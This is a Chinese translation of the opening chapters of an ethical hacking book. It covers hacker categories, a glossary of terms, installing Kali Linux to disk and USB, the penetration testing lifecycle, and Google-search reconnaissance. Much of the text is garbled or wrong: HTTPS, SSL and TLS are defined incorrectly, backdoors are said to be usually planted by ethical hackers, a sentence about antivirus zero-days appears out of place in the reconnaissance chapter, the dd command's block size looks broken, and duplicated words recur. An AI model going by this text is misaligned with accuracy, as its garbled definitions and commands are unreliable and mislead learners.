- "# 道德黑客攻击：通过高级道德黑客技术与方法学习渗透测试与网络安全\n\n\n\n![](img/Image00000.jpg)\n\n\n\n\n\n\n\n\
  \n# 引言\n![](img/Image0003.jpg)\n《道德黑客：通过高级黑客技术与方法学习渗透测试网络安全》将向你介绍黑客的概念，并让你对道德黑客有更深入的理解。本书旨在教你如何使用道德黑客可用的最强工具：Kali\
  \ Linux 进行渗透测试生命周期。本书将带你了解世界上不同类型的黑客、他们的黑客动机，以及普通用户如何避免成为黑客的目标。你将学习如何下载和安装 Kali\
  \ Linux，使其成为你道德工具箱中的永久工具。本书将详细介绍渗透测试生命周期的五个阶段：侦察、扫描、利用、维持访问和报告。Kali Linux 提供了数百种工具用于渗透测试生命期的每个阶段。本书的每一章都将阐述渗透测试生命周期，并涵盖各个阶段常用的工具。报告阶段将教你如何创建详细报告，向高层展示渗透测试活动的结果，以便他们了解修复组织数字基础设施漏洞所采取的措施。\n\
  \n本书面向技术人员和软件工程师。不同技术领域的技术人员可以从了解渗透测试员和道德黑客如何工作中获益。软件工程师通过了解他们的软件如何受到攻击，可以更好地理解漏洞。这将确保他们在软件开发阶段能够加小心。当然，开发阶段仍然会有错误，但关于渗透测试的知识可以帮助他们大幅减少这些错误。此外，想要改变现有职业并转行渗透测试的技术人员可以从书中中学到很多。技术人员已经拥有其所属领域的知识，这可以作为切换到道德黑客职业的先决条件。例如，拥有服务器技术知识和经验的服务器管理员可能会成为作为道德黑客保护该服务器的最佳人选。这也适用于其他技术职业。\n\
  \n想要提高黑客攻击知识的安全工程师或道德黑客可以从书中获益，从而更好地保护他们正在工作的系统。安全工程师和道德黑客可以通过应用书中提到的道德黑客步骤，开发并自动化自己的工具，以支持和保护他们所工作组织的系统。本书将成为信息安全领域学生的宝库。关于渗透测试的见解将帮助信息安全学生理解这一领域。\n\
  \n\n\n\n# 1. 从传统意义上说，黑客是对学习新事物充满好奇的人，因此他们喜欢钻研技术以了解其工作原理。他们通常喜欢玩计算机系统，并喜欢理解事物在电子层面是如何运作的。\n\
  \n# 2. 近年来，“黑客”一词有了新的含义——指那些为了个人利益对系统执行恶意攻击的人。从技术角度上说，他们被称为 `crackers`（破解者），这是 criminal\
  \ hackers（犯罪黑客）的缩写。\n\n`Criminal hackers` 为了个人利益、名声甚至报复而侵入系统。他们进入系统是为了修改、删除或盗取信息，在此过程中让人们的生活变得痛苦不堪。\n\
  \n## 黑客与破解者之间的区别\n\n`hacker` 这个词被多次错误地使用，而实际应该使用的术语本应是 `cracker`。由于这一点，人们产生了一个常见的误解，认为\
  \ `hacker` 是那些侵入系统盗取信息的人。这并非事实，并且损害了全球才华黑客的声誉。\n\n`hacker` 对计算机操作系统的运作充满好奇，并且通常接受过编程语言训练。编程知识帮助黑客发现系统中的漏洞以及这些漏洞产生的原因。黑客不断尝试获取有关新系统或软件漏洞的知识，并将他们发现的内容与开发者分享。他们绝没有破坏系统或盗取信息的意图。\n\
  \n相比之下，`cracker` 或 `criminal hacker` 是侵入系统以破坏系统并为了个人利益盗取信息的人。破解者获得对系统或其关联网络的授权访问，盗取信息，停止影响真实客户的系统服务，并为系统所有者造成破坏。由于他们的恶意行为，破解者很容易识别。\n\
  \n## 黑客的类型\n\n根据知识水平，黑客可分为几类。以下是一些常见类型：\n\n### 编码员 (Coders)\n`Coders` 是受过高度训练的软件工程师，他们知道如何编译代码来攻击系统。他们可能也可能使用他们的知识来攻击系统。然而，他们不断提高自己的技能和知识，并与不断变化的技术接轨。他们大多数创建应用程序来识别系统中的漏洞。他们进一步研究漏洞以找到永久修补漏洞的方法。Coders\
  \ 拥有 `TCP/IP` 栈和 `OSI 分层模型`的核心知识。\n\n### 脚本小子 (Script Kiddies)\n这组黑客是最危险的，并不是因为他们非常博学，而是因为他们完全相反。他们使用由其他黑客设计和开发的脚本，很少知道这些脚本能做什么。他们会从互联网上免费获取现成的脚本和工具，并在网络上的随机系统上执行它们。他们不测试工具，而且非常漫无目的。在使用这些工具时，他们会在整个互联网上留下数字指纹。\n\
  \n大多数脚本小子是青少年，他们在互联网上随机制造混乱，以在朋友中获得获得炫耀的资本。值得注意的是，成为一个脚本小子不需要很高的技巧。简单来说，脚本小子是使用真实犯罪分子开发的工具来攻击系统和网络的“白玻鼠”。脚本小子不会作为黑客获得任何尊重，但由于行为可能会让每个人都感到困扰，因为他们在执行操作时不承担任何责任。\n\
  \n### 管理员 (Admins)\n`Admins` 是接受过训练的专业人员，负责通过使用开发者设计的工具来管理操作系统。Admins 不开发自己的工具，但了解操作系统的每一个角落。人们可以通过参加特定操作系统的认证和培训来成为系统管理员。当今世界上大多数黑客都接受过此类培训，也可以被称为\
  \ Admins。Admins 对操作系统和现有缺陷有丰富的知识。担任安全顾问或组织安全团队的人员也被称为系统管理员。\n\n接下来，让我们根据他们的活动来理解黑客。\n\
  \n### 白帽黑客 (White Hat Hacker)\n`White Hat hacker` 是处理道德黑客的人。道德黑客是拥有黑客技术以及黑客所需工具知识与技能的安全的安全专业人员。他们通常被组织雇佣以发现其系统中的安全漏洞，并在真实攻击发生前实施措施修补这些漏洞。\n\
  \n白帽黑客也被称为渗透测试员。他们的主要重点是发现漏洞并修补它们，以为组织内的系统提供安全保障。\n\n鉴于本书完全关于道德黑客，我们将在本书的学习过程中详细学习白帽黑客的功能。\n\
  \n### 黑帽黑客 (Black Hat Hacker)\n`Black Hat hacker` 是本质上不道德的人，他们为了个人利益侵入系统。这些人是犯罪分子和破解者，他们利用技能和知识为了恶意或非法目的访问系统。有时，他们只是声名狼藉，想要违反系统的完整性以骚扰系统所有者。\n\
  \n黑帽黑客也被称为安全破解者或不道德黑客。他们的主要意图是为了金钱利益盗取信息。\n\n###灰帽黑客 (Grey Hat Hacker)\n`Grey Hat\
  \ hacker` 介于白帽和黑帽黑客之间。他们通常没有伤害任何人的意图，也不会为了任何个人利益利用系统，但在利用过程中可能会有意识地或无意地实施恶意行为。灰帽黑客也被称为工作在白帽和黑帽黑客之间的混合黑客。\n\
  \n## 什么是道德黑客攻击？\n\n通过授权程序突破信息系统的安全性，以识别系统或其关联网络的弱点和漏洞的过程被称为道德黑客攻击。道德黑客或白帽黑客获得系统所有者的授权，在系统上运行测试。然后，道德黑客检查该系统的安全设置。恶意攻击与道德黑客攻击的区别在于，后者是有计划的攻击，因此是完全合法的。\n\
  \n道德黑客的工作是识别安全系统中的漏洞，恶意攻击者可以利用这些漏洞获取系统访问。道德黑客会对信息系统进行多次测试，以收集有关其的信息并使其更加安全。因此，他们的最终目标是确保信息系统足够强大，能够对所有入侵攻击提出严峻挑战。\n\
  \n道德黑客使用以下方法扫描系统漏洞。然而，扫描过程不仅限于以下方法：\n\n*   系统身份验证机制的突破。\n*   关键公司数据的泄露。\n*   系统安全设置的修改。\n\
  *   注入攻击。\n*   组织网络和系统的访问点。\n\n\n\n\n\n# 道德黑客准则\n\n对于道德黑客，定义了必须始终遵守的规则和原则。如果不遵守这些规则，可能会导致糟糕的后果。在执行攻击测试时，这些规则和原则被遗忘或忽视是常见现象。其结果对组织来说可能是非常危险的。以下是道德黑客的一些主要准则：\n\
  \n## 道德地工作\n`ethical`（道德）一词意味着以专业的职业操守和原则进行工作。当你对一个组织的系统进行道德黑客测试时，你需要确保所有测试都已获得批准并支持组织的目标。道德黑客不允许有任何隐藏目的。信任是道德黑客领域最大的因素。在执行测试期间获取的信息不应被道德黑客留作个人利益，因为这就是白帽黑客与黑帽黑客的区别。\n\
  \n## 尊重隐私\n道德黑客在进行渗透测试时会获得大量的个人信息。他被要求以尊重的方式对待这些信息，并且将其用于个人利益。在渗透测试期间收集的所有信息，从网络浏览活动到密码，都必须保持保密。\n\
  \n## 确保系统不受损坏\n组织拥有的系统和信息非常有价值，绝不能以任何代价造成损坏。道德黑客应该阅读有关组织数字基础设施的所有可用文档，以防在无意中阻碍系统。如果你在系统上同时运行过多的测试，系统可能会崩溃。如果系统在生产时间内崩溃，可能会导致组织巨大的收入损失。\n\
  \n## 执行计划\n时间和耐心在道德黑客领域非常重要。在执行测试时，你需要非常小心，并确保没有授权的员工知道你在做什么。在执行测试期间，会有许多眼睛盯着你，而且在实践中无法得知组织的员工是否想对其产生伤害。你所做的就是尽可能安静、私密地进行测试，并且除了雇佣你完成这项工作的老板之外，不向任何人泄露任何信息。\n\
  \n道德黑客有时会将系统补丁做得过头，通过加固系统来防御可能根本都不会发生的攻击。例如，如果组织没有内部 Web 服务器，那么保护系统的网络将毫无帮助。然而，同时，请确保你的系统能够防范可能物理访问系统的恶意员工。\n\
  \n## 黑客行动主义 (Hacktivism)\n根据《韦氏-韦伯词典》，Hacktivism（黑客行动主义）被定义为“为了进一步政治或社会活动目标而进行的计算机黑客行为（如对网络或网站的渗透和破坏）”。Hacktivism\
  \ 一词的发明归功于 90 年代初期活跃的 `Cult of the Dead Cow` 黑客组织。黑客行动主义最初起源于在线游戏社区，进一步演变为在互联网上匿名用于共同事业。黑客行动主义者大多是使用互联网空间并与志同道合者保持联系的年轻人。\n\
  \n开放的互联网为黑客行动主义者提供了匿名和使用别名的机会，主要在互联网上合作分享盗版内容、盗版软件等。大多数黑客行动主义者旨在推翻“建制”，这主要是指他们不满的特定政府或资本主义公司。获得大量关注的团体包括\
  \ `Anonymous`、`Syrian Electronic Army` 和 `Lulzsec`。随着互联网连接到世界上最遥远的角落，黑客行动主义者意识到他们在互联网上的行为个人风险非常小。\n\
  \n## 网络恐怖主义\n当技术被用来赋能恐怖主义时，网络恐怖主义出现了。大众中存在一种常见的误解，认为犯罪和恐怖主义是一样的。区别在于恐怖主义具有政治动机，而犯罪可以有个人动机。犯罪活动和恐怖活动造成的伤害程度也不同。例如，美国的一项法令将“恐怖主义”定义为：\n\
  (i) 实施任何国家法律下构成“犯罪”的行为；\n(ii) 恐吓或胁迫平民，通过恐吓或胁迫影响政府政策，或通过大规模破坏、暗杀或绑架影响政府的运作。\n\n随着技术的进步，恐怖组织开始利用计算机技术针对平民，并阻碍社会维持内部秩序的能力。他们已成功地将技术作为大规模杀伤性武器。\n\
  \n## 为什么黑客要攻击？\n犯罪黑客攻击系统主要是因为他们单纯可以。对于某些人来说，黑客可能仅仅是一种爱好，他们通过攻击自己的系统来查看什么可以破解，什么不能破解。许多黑客通常是由于组织解雇的前员工，他们想要通过窃取敏感信息来报仇。恶意黑客攻击是为了获得对系统的控制，这满足了他们的自尊心并导致成瘾。有些黑客只想成名，而另一些人想让对方的生活变得痛苦。大多数恶意黑客有共同动机，如好奇、报仇、盗窃、挑战、无聊和公司工作压力。\n\
  \n## 黑客术语\n我们将通过讨论黑客中最常用的术语来结束本章，你将在书的剩余章节中看到它们。\n\n### 钓鱼 (Phishing)\n钓鱼是黑客领域最流行的术语。钓鱼是黑客用来欺骗用户泄露关键信息（如用户名、密码、银行详情等）的方法。钓鱼者会伪装成真实身份，针对某个人，并使其泄露信息。收集的信息可能被黑客进一步用于恶意目的。\n\
  \n例如，钓鱼者会向目标发送一封邮件，邮件看起来像是来自目标的银行的。邮件会要求用户提供银行信息，或者包含一个链接，将用户重定向到一个看起来像其银行网站的网站。用户将完全不知道该网站的真实性，并在其上输入银行账户详情。钓鱼属于社会工程。\n\
  \n### 恶意软件 (Malware)\n经常听到的另一个术语是恶意软件。你可能以前听过它，某些网站可能被恶意软件感染，让我们更好地理解这个术语。恶意软件是黑客开发的用于攻破计算机防御并从系统中窃取关键信息的软件。恶意软件进一步分类为\
  \ `viruses`（病毒）、`worms`（蠕虫）、`trojans`（木木马）、`spyware`（间谍软件）、`keyloggers`（键盘记录器）等。\n\
  \n### 后门 (Backdoors)\n经常与木马混淆的是，后门是一个在受损系统后台运行的程序，便于未来进入系统。后门通常由道德黑客实施，以便黑客访问系统。\n\
  \n### 木马 (Trojan Horse)\n通常被称为 `Trojan` 的木马是植入目标系统，以执行攻击者所需功能的恶意程序。人们经常将木马视为病毒，由于其性质。木马与病毒的区别在于，木马是一个独立程序，不依赖其他程序来执行。\n\
  \n### 病毒 (Virus)\n病毒被定义为影响系统程序的恶意代码或软件。病毒能够感染文件、扇区、内存空间甚至硬件。病毒有以下子类：\n`Resident\
  \ Virus`（驻留病毒）：在系统启动后进入 RAM 空间，并在程序和系统之间切换。\n`Nonresident Virus`（非驻留病毒）：依赖硬盘进行执行；在执行完成后从内存中退出。\n\
  \n### 勒索软件 (Ransomware)\n截至 2020 年，勒索软件是互联网上搜索频率最高的术语之一。勒索软件是一种锁住用户系统并阻止访问所有文件的恶意软件。它随后在屏幕上显示勒索信息，要求用户支付比特币以重新获得访问权限。勒索软件最初针对个人用户，但很快意识到攻击银行、医院和企业等大型机构可以获得更多收益。`Petya`\
  \ 勒索攻击是影响全球企业的勒索软件的一个案例。在这种攻击中，勒索软件在所有 ATM 上显示索钱的消息 `schadbank`。\n\n### 欺骗 (Spoofing)\n\
  邮件欺骗和 IP 欺骗是更常见的术语。在邮件欺骗中，会修改邮件的头部，使其看起来像是来自真实来源。例如，黑帽黑客会修改邮件的头部，使其看起来像是由你的银行发送的真实邮件。另一方面，IP\
  \ 欺骗是指从黑客计算机发送到你计算机的意外数据包，但源 IP 被更改，使其看起来来自合法系统或受信任主机。黑客希望你的系统接受此数据包，从而授予其访问系统的权限。\n\
  \n### 加密 (Encryption)\n加密是一种编码信息或数据使其秘密或不可读的技术。只有拥有 `decryption key`（解密密钥）的授权方才能将信息转换回原始格式并再次可读。勒索软件攻击的基础是加密，它攻击系统并加密其文件。黑客在用户支付勒索金后提供解密密钥。\n\
  \n### 广告软件 (Adware)\n广告软件是向你的系统注入大量广告的软件。然而，它还会秘密监控你的活动，并根据你的互联网活动生成广告。有时广告软件非常恶意，会在你的系统上不断弹出广告，并使其运行变慢。植入你系统的广告软件可以收集个人信息、网络活动，并将其提供给攻击者进行钓鱼攻击。广告软件术语在营销领域非常流行。像\
  \ Google 这样的索引网站已经在广告让你进入欺骗性网站时开始显示警告。\n\n### 零日漏洞 (Zero-Day Threat)\n一种新的且未被病毒扫描程序记录的威胁，因此可以绕过扫描。这种威胁被称为零日漏洞。这种漏洞在杀毒软件中非常常见，特别是当杀毒软件开发人员对数字世界的新威胁了解不足时。零日漏洞将通过浏览器和邮件附件等向量利用系统。\n\
  \n### 暴力破解 (Brute Force Attack)\n暴力破解是另一种流行的黑客术语，用于绕过互联网上的登录页面。暴力破解也称为穷举密钥搜索，是一种采用试错法来猜测密码和其他加密信息等的方法。黑客使用这种方法破解管理员账户的密码，然后可以用此来窃取系统上的几乎所有信息。\n\
  \n### HTTPS/SSL/TLS\nGoogle Chrome 是 2020 年世界上最流行的互联网浏览器，`HTTPS` 代表超文本传输协议，`SSL`\
  \ 代表安全（Secure）。`TLS` 也代表安全（Secure）。网站上安装了 `SSL` 证书，以确保用户浏览器和网站之间的信息始终经过加密。`SSL`\
  \ 和 `TLS` 是验证网站身份的协议。\n\n### 机器人 (Bot)\n机器人是在互联网上运行自动化脚本的机器人。搜索引擎通常雇用机器人作为爬虫，爬取所有网站以收集关于它们的信息。\n\
  \n### 僵尸网络 (Botnet)\n僵尸网络是由黑帽黑客控制的机器人网络。黑帽黑客可能会创建一个僵尸网络来发动诸如 `DDoS`（分布式拒绝服务）的攻击、发送垃圾邮件、窃取信息并允许访问多个系统。僵尸网络将帮助黑客变得无法追踪并加强攻击。\n\
  \n### DDoS (Distributed Denial of Service)\n这种黑客术语在黑客中非常流行，对所有者来说都是骚扰。黑帽黑客利用一群僵尸来执行\
  \ DDoS。僵尸拥有代码，将随机数据包发送到服务器，导致服务器负载甚至完全将其关闭。这种流行的 DDoS 攻击持续了数月。\n\n### 防火墙 (Firewall)\n\
  防火墙是用于保护网络并监控入站流量的软件。它过滤掉来自不可信源的入站数据，确保网络内部通信的安全。防火墙可以通过软件和硬件实施。为了应对黑客，防火墙仍然寻找绕过它们的方法。\n\
  \n### 载荷 (Payload)\n通过网络传输的数据包被称为载荷。在黑客攻击中，载荷是传输过网络并植入目标系统的病毒，以利用它。\n\n### 根工具包\
  \ (Rootkit)\n根工具包是用于破解系统最危险的方法之一，它们在大多数时候无法被检测。在黑帽黑客手中，根工具包会导致完美的窃取。黑客使用不同通道在目标系统上植入并安装根工具包。一旦植入根工具包，黑帽黑客将获得系统的\
  \ god 权限。根工具包在操作系统底层运行，并可以长时间不被发现。\n\n### 远程访问工具 (RAT)\n`RAT` 代表远程访问工具（Remote Access\
  \ Trojan）。它是由业余黑客操作的恶意应用程序。一旦 `RAT` 安装在目标系统上，黑客就可以完全访问该系统。RAT 的主要意图是像从家里远程操作计算机一样，合法的地访问目标系统。\n\
  \n### 垃圾邮件 (Spam)\n垃圾邮件术语主要与电子邮件有关。用户收到的任何不受欢迎的邮件都被归类为垃圾邮件。垃圾邮件包含广告。垃圾邮件者从数据库中收集大量邮件地址并发送批量邮件推广产品。然而，垃圾邮件也可以通过邮件中的链接将用户重定向到非法网站。建议收到垃圾邮件后立即使用垃圾邮件过滤器。\n\
  \n### 蠕虫 (Worm)\n蠕虫是一种能够自我复制的恶意代码。然而，与病毒不同，蠕虫不需要寄宿在文件中并可以独立存在。它可以不需要人类交互的情况下通过网络进一步传播到各种系统。自我复制的蠕虫会占用系统资源，如内存、磁盘空间和处理器时间，使你的系统变慢。如果不能及时从系统中移除，蠕虫可能会导致灾难性的后果。\n\
  \n### 伪装 (Cloaking)\n正如词义所示，伪装指的是覆盖信息。黑客利用伪装向用户展示恶意网站，同时使其看起来是合。黑客使用 Web 服务器上的 `.htaccess`\
  \ 规则和动态脚本使特定的 IP 地址和另一组 IP 地址不可见。如果 Google 检测到伪装，将在你的网站上广告。\n\n### 渗透测试 (Penetration\
  \ Testing, Pentesting)\n渗透测试可以定义为道德黑客在指南和批准范围内攻击系统而采用的方法、流程和程序。这种测试评估了组织数字基础设施在技术、运营和管理层面的安全性。通常，道德黑客只会根据其构建测试信息系统的安全性。系统或网络管理团队不需要知道渗透测试正在进行。\n\
  \n### 漏洞分析 (Vulnerability Analysis, Vulnerability Assessment)\n漏洞评估或漏洞分析被用于评估组织信息系统的安全性。安全团队将尝试找到操作系统以及系统上所有其他安装软件中缺失的安全补丁。漏洞评估团队可以通过第三方聘用，也可以是组织内部的团队。\n\
  \n### 安全控制评估 (Security Controls Assessment)\n涉及法律和监管要求的信息系统安全性评估被称为安全控制评估。这些要求包括但不限于\
  \ `FISMA`（联邦信息管理法）、`HIPAA`（健康保险流通与责任法案）和 `PCI`（支付卡行业）。组织需要安全控制评估作为证据主体（BOE）来授权其基础设施。\n\
  \n# 第二章：Kali Linux\n\n在本章中，你将学习道德黑客可以拥的最强大工具：`Kali Linux`。你将学习如何下载和安装 Kali Linux，以便可以使用操作系统内置的渗透测试工具。\n\
  \n## 硬盘安装 (Hard Disk Installation)\n要开始安装，请将 DVD 放入计算机驱动器，或插入你加载了 Kali Linux 安装介的\
  \ USB 盘。根据你使用的设备，需要在计算机的 BIOS 设置中设置启动优先级，以便从相应的介质启动。\n\n## 首次启动 Kali Linux (Booting\
  \ Kali Linux for the First Time)\n如果你成功从 DVD 或 USB 盘加载了安装介，你将看到一个屏幕。我们将执行的安装将删除硬盘上任何现有的操作系统并将其替换为纯\
  \ Kali Linux。\n\n### 设置默认值 (Setting the Defaults)\n接下来的屏幕将让你选择 Kali Linux 系统的默认设置，例如语言、位置和键盘语言。选择适用于你区域的设置并点击继续继续安装。\n\
  \n###set 网络设置 (Initial Network Setup)\n系统上会出现一个屏幕，你可以在其中输入选择的主机名。尽量保持其唯一。点击下一步后，系统将要求你输入完全限定域名。这是为了合法的操作，如远程操作计算机，黑客意识到其优势并利用此非法访问目标系统。\n\
  \n### 密码 (Password)\n下一个屏幕将提示为 root 账户设置密码。root 账户是系统的超级用户，拥有系统的所有权限。root 账户的默认密码是\
  \ `root`，建议将其更改为复杂的密码。密码包括：大写、小写、数字和符号。\n\n## 磁盘分区 (Disk Partitioning)\n有多种方法为 Linux\
  \ 分区。在本书中，我们关注引导式分区（Guided Partitioning）。使用“引导式 - 使用整个磁盘”选项进行安装。下一个屏幕将显示系统上的所有物理硬盘。点击代表你的硬盘的硬盘并点击继续。下一个屏幕将向你你如何使用可用的硬盘。\n\
  \n## 配置包管理器 (Configuring the Packet Manager)\n在安装程序完成文件复制到硬盘后，下一个屏幕将向你配置 Linux 系统的包管理器。包管理器对于系统获取更新至关重要。\n\
  \n## 安装 GRUB 加载器 (Installing GRUB)\n在下一个屏幕上，将询问你是否要为 Kali Linux 系统安装 GRUB 引导程序。选择\
  \ Yes 并继续。\n\n## 完成安装 (Completing the Installation)\n最后，你将到达完成界面。点击继续，系统应该重启。拔出安装\
  \ DVD 或 USB 盘并继续。你现在应该看到 Kali Linux 的欢迎界面。使用设置的密码登录 root 用户；完成！\n\n## USB 盘安装 (USB\
  \ Drive Installation)\nUSB 盘也称为优盘或 闪存，是可以插入 USB 端口的存储设备。建议使用至少 8 GB 的 USB 盘来安装 Kali\
  \ Linux。可以在 BIOS 设置中设置 USB 启动优先级。\n\n### 持久性和非持久性 (Persistence and Non-persistence)\n\
  在使用 USB 盘启动操作系统时，有两个重要的术语：持久性和非持久性。持久性是指系统在重启后保留对其文件所做的更改。非持久性意味着系统在重启后将丢失之前的所有更改。书中，通过\
  \ Linux 机器的 USB 盘安装是持久性的，通过 Windows 机器是非持久性的。\n\n### Windows 非持久性安装 (Windows Non-Persistent\
  \ Installation)\n在 Windows 下继续安装 Kali Linux 到 USB 盘之前，你需要下载 `Win32 Disk Imager`。你可以从\
  \ URL 下载它：https://sourceforge.net/projects/win32diskimage/。下载好 Kali Linux ISO 后，将\
  \ USB 盘插入计算机。Windows 应自动检测并为其分配驱动器号。接下来，启动 `Win32 Disk Imager` 应用。点击文件夹图标浏览选择之前下载的\
  \ Kali Linux ISO 并点击 OK。从下拉列表中选择 Windows 分配给 USB 盘的驱动器号。点击 Write 按钮开始向 USB 盘写入 Linux\
  \ 操作系统。写入完成后，重启电脑并进入系统。你可以选择 Live 选项直接从 Live USB 启动 Kali Linux 桌面。\n\n### Linux\
  \ 持久安装 (Linux Persistent Installation)\n在为 Kali Linux 安装持久 USB 盘时，大小非常重要。确保你的系统中安装了\
  \ `GParted` 应用。如果在安装 `GParted` 时遇到困难，请查看文档。你可以使用以下命令之一通过终端安装 `GParted`：\n```\napt-get\
  \ install gparted\naptitude install gparted\nyum install gparted\n```\n下载 Kali Linux\
  \ ISO 后，将 USB 盘插入计算机。\n\n在 Linux 终端使用以下命令确定 USB 盘的位置：\n```\nmount | grep -i udisks\n\
  ```\n你应该会获得 USB 盘的文件位置，类似于 `/dev/sdb1`。请注意这在你的系统上可能不同。删除命令末尾的任何数字。\n\n使用 `dd` 命令将\
  \ Kali Linux ISO 写入 USB 盘，如下：\n```\ndd if=kali_linux_image.iso of=/dev/sdb bs=4\n\
  ```\n使用以下命令启动 `gparted` 应用：\n```\ngparted /dev/sdb\n```\n驱动器应该显示一个已经安装了 Kali Linux\
  \ 镜像的分区。你需要从出现的菜单中选择 `New` 添加另一个分区。指定大小。将文件系统设置为 `ext4`。点击 `Apply`。\n\n使用以下命令为 USB\
  \ 盘添加持久性功能：\n```\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"persistence\"\
  \ | tee -a /mnt/usb/persistence.conf\necho \"root\" | tee -a /mnt/usb/fstab\numount\
  \ /mnt/usb\n```\n就是这样。你现在创建了一个持久性的 Live USB。重启系统，你应该能够从 USB 启动 Kali Linux。\n\n#\
  \ 第三章：渗透测试生命周期 (Chapter Three: The Penetration Testing Lifecycle)\n\n道德黑客也被行业称为渗透测试员。道德黑客精通渗透测试周期。组织雇佣道德黑客以便在其基础设施上进行多次渗透测试。大众中有一种常见的误解，认为道德黑客或渗透测试员只需要坐在电脑前运行一段代码就可以访问任何系统。人们产生这种想法是因为电影里的，但这并非事实。多年来，已经建立了一个被道德黑客采用的确定框架，该框架的前四个阶段引导道德黑客发现系统中的漏洞并理解这些漏洞如何被利用。相比之下，最后一个阶段是向管理层提交关于这些发现的整洁报告。每个阶段都从前一个阶段获取输入并提供给下一个阶段。该过程按顺序执行，但道德黑客返回前一个阶段去分析信息的情况并不常见。渗透测试生命周期的四个阶段为：`Reconnaissance`（侦察）、`Scanning`（扫描）、`Exploitation`（利用）和\
  \ `Maintaining Access`（维持访问）。渗透测试生命周期的第五个阶段是 `Reporting`（报告）。这是 EC-Council 定义的渗透测试生命周期的各个阶段的各个阶段。你可能会争辩，书中没有包含最后一个阶段，即\
  \ `Covering Tracks`（隐藏踪迹）。我们故意留下了书中这一阶段，以重点关注前四个阶段，并介绍 `Reporting`，这涵盖了流行的 `CEH`（认证道德黑客）课程。\n\
  \n## 渗透测试生命周期的五个阶段 (The Five Stages of the Penetration Testing Lifecycle)\n\n我们将通过军事在国际边界情况下的类比来讨论渗透测试生命周期的五个阶段。\n\
  \n### 第一阶段：侦察 (Stage 1: Reconnaissance)\n想象一个光线昏暗的房间，分析师和官员正在查看地图。房间里的其他分析师看着电视上的新闻并做记录。房间里有一个最终小组正在准备每个小组收集的所有信息的终稿。这个场景告诉你在侦察期间发生了什么，但与道德黑客在渗透测试生命周期的侦察阶段所做的非常相似。组织将雇用渗透测试员或道德黑客从公共来源获取尽可能多的目标信息。\n\
  \n### 第二阶段：扫描 (Stage 2: Scanning)\n继续军事类比，想象防线后有一个山头，有一名躲在灌丛中的军队士兵。士兵带回了敌人位置的报告。这就是扫描阶段。道德黑客使用第一阶段收集的信息来扫描目标网络和系统，这将在利用阶段进一步使用。\n\
  \n### 第三阶段：利用 (Stage 3: Exploitation)\n你军队的四名士兵在深夜穿过一片开阔的地野，戴着夜视镜看到一切。这又是道德黑客在利用阶段将要做的。该阶段的目的仅仅是快速进入目标系统。\n\
  \n### 第四阶段：维持访问 (Stage 4: Maintaining Access)\n根据四名士兵提供的敌人计划，工程团队在土地上挖了一个洞，开辟通往拥有所有信息的敌营之路。其目的是为房间提供持续且方便的访问。道德黑客在维持访问阶段做同样的事情。目标是进入目标系统并快速离开。\n\
  \n### 第五阶段：报告 (Stage 5: Reporting)\n士兵小组的指挥官现在站在他的高级官员（如将军和海军）面前，向他们解释突击的细节。每一步都得到了详细解释，每个细节都进一步扩展以解释利用是如何成功的。在测试生命周期的末尾，道德黑客还需要创建一个报告，解释黑客过程的每个阶段、发现的漏洞以及目标系统。报告建议了采取的步骤以确保基础设施安全。\n\
  \n# 第四章：侦察 (Chapter Four: Reconnaissance)\n\n在本章中，你将深入理解渗透测试生命周期的侦察阶段。侦察过程将帮助道德黑客发现关于目标组织及其基础设施的各种信息。在此阶段收集的信息将用于渗透测试生命周期的后期阶段与目标组织接接。\n\
  \n正如军事在创建战斗策略前分析所有可用信息一样，道德黑客在计划对其进行渗透测试之前，需要收集关于目标系统的所有公开信息。很多时候，所需的信息可以从 Google\
  \ 或社交媒体等搜索引擎获取。域名的 `nameservers` 可以用于获取信息。因此，`nameservers` 也可以用于检索目标网站的前端。当侦察阶段开始时，黑客知道关于目标的少数细节。这种漏洞在杀毒软件中非常常见，特别是当杀毒软件开发人员对数字世界的新威胁了解不足时。侦察阶段总是由\
  \ `ROE`（攻击规则）定义的。渗透测试将限制执行诸如 `DoS`（拒绝服务）和 `DDoS`（分布式拒绝服务）攻击。\n\n侦察阶段的主要目标是发现尽可能多关于目标的信息。以下重要信息：\n\
  - 组织的结构；\n- 组织的组织图；\n- 用于各种软件和硬件的技术；\n- 组织的物理位置；\n- 电话号码。\n\n### 所有单词 (All These\
  \ Words)\n这个输入字段可以用于寻找包含你在字段中输入的所有单词的网页。\n\n### 以目标网站开始 (Start with Target’s Website)\n\
  通过 `site:example.com` 使用运算符可以过滤特定的网站信息来开始侦察过程。\n\n### 数字范围 (Numbers Ranging From)\n\
  该搜索字段包含两个输入字段。你可以使用数字范围如 `1000-2000`。\n\n### 站点或域名 (Site or Domain)\n这个输入字段被证明非常有助于缩小范围。例如，如果你的搜索是关于政府机构的，你可以指定\
  \ `.gov` 域名。如果你想搜索限制在 `facebook.com` 的结果，可以使用 `site:facebook.com`。\n\n### 文件类型 (Filetype)\n\
  该搜索参数帮助你限制搜索结果以显示特定文件类型的网页。你可以使用 `filetype:` 运算符查找这些文件。\n\n### 使用权限 (Usage Rights)\n\
  此搜索标准限制搜索结果的版权。如果你选择“免费使用”或“商业”选项，搜索将返回共享的网页。\n\n### Google 搜索 (Google Search)\n\
  Google 搜索可用的高级搜索运算符可以很大程度上被用于侦察。你可以在网址 `https://www.google.com/advanced_search`\
  \ 定位 Google 高级搜索。这将打开一个网页。该工具的上帮助你通过包含或排除术语或数字查找网页。该工具的下半部分将帮助你的搜索更具体。道德黑客可以使用该工具中所有可能的输入字段组合来根据需求创建搜索字符串。使用多个输入字段会使搜索复杂但更准确。\n\
  \n### 精确的单词或短语 (This Exact Word or Phrase)\n向短语提供单词输入将导致 Google 搜索包含这些单词且顺序相同的网页。如果你使用引号\
  \ `\"phrase\"`，这种搜索是有效的。\n\n### 任何单词 (Any of Words)\n在此字段中提供的输入提供“或”查询的结果。Google\
  \ 搜索会在你输入的单词之间放置 `OR` 连接符。\n\n### 无任何单词 (None of Words)\n这是“任何单词”的反面。Google 搜索将排除包含你输入的单词的网页。Google\
  \ 搜索会在单词前放置减号 `-word`。\n\n### 网站镜像 (Website Mirroring)\n有时下载整个目标网站并在离线评估更有效。一组自动化工具可以在离线运行以复制。`wget`\
  \ 命令用于复制网站的所有 HTML 和 CSS 文件。\n```\nwget -m -p -E -k -np -v http://example.com\n\
  ```\n`wget` 命令后面跟着几个选项和开关。你可以使用 Kali Linux 中的 `man` 页面了解更多这些选项的功能。\n```\nman wget\n\
